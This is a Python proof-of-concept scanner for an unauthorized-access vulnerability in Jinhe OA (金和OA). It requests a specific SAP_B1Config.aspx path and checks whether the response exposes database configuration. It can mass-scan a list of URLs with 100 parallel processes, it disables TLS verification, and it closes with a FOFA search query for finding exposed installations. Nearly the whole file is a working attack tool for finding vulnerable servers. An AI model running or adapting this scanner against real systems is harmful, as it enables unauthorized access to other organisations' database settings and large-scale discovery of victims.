import requests,argparse,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text = """金和OA未授权漏洞"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="金和OA未授权漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input url') # 添加命令行参数
    parser.add_argument('-f','--file',dest='file',type=str,help='please input file')# 添加命令行参数
    args = parser.parse_args() # 解析命令行参数
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open (args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3{sys.argv[0]} -h")
def poc(target):
    payload = "/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1CostEAI/SAP_B1Config.aspx/?manage=1"
    try:
        res1 =requests.get(target+payload,verify=False,timeout=5)
        if res1.status_code == 200 and "数据库名:" in res1.text:
            print(f"[+]{target}存在未授权访问漏洞")
            with open('金和OA未_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在未授权访问漏洞")
        else:
            print(f"[-]{target}不存在未授权访问漏洞")
    except:
        print(f"{target}可能存在未授权访问漏洞请手工测试")
if __name__ == '__main__':
    main()

# fofa    app="金和网络-金和OA"